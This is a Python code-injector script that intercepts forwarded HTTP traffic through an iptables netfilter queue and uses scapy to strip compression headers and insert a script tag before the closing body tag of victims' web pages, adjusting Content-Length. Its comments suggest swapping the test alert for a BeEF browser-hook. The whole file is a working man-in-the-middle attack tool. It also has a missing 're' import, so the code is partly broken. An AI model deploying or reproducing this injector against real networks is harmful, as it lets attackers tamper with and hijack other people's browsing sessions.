#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse
import http

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # since we modified the packet, the below values change, so we just delete it and scapy will auto recalculate
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


# We'll try to modify the response instead of request since if we modify request we'll have
# to work on the TCP handshake too. But if modifying response, the handshake is already done


# for code injector once we get the html code in the Raw.load, we can try to add some html/js code jst before </body> tag since that is present only once in the entire page.
# if we add code after <body> tag then incase the code takes time to process, the entire page will take time to load. so </body> tag at the end of page is preferable

# Once we inject our code, it works fine on some websites but not all - because we have increased the content of the page but the "Content Length" in the response is not modified

# but not all responses have the content length parameter eg. when the server is just sending javascript or images or css etc. 
# Those pages do not have body tag, thus no code is injected but we still modify the content length if we dont do a proper check
# thus the check 'text/html' in load is necessary if we are going to inject code change the content length

# we can inject the BEEF hook code where we sent alert("test")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # We use scapy.Raw to basically check for HTTP layer, since Raw contains the Data and the other
    # layers are IP/TCP/UDP
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("Request")
            #print(scapy_packet.show())
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            
        elif scapy_packet[scapy.TCP].sport == 80:
            print("Response")
            #print(scapy_packet.show())
            injection_code = "<script>alert(\"test\");</script>"
            load = load.replace("</body>", injection_code + "</body>")
            # () () below are used to split "Content-Length:\s\d*" into 2 groups 
            # so that in the first group we can add ?: which means dont include it in the output, just search using that
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and 'text/html' in load:
                # group(0) returns everything, group(1) will return the part we want
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
            
        # if load has changed above then create the new packet    
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
            
    packet.accept()
   


# For local computer testing we modify OUTPUT INPUT instead of FORWARD
# subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
# subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])


# For MITM, we modify the FORWARD chain
subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

print("[+] Successfully modified iptables...")

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("[+] Successfully flushed iptables...")

# http://www.winimage.com/download.htm, http://www.bing.com, http://www.winzip.com/win/en - use this link to test












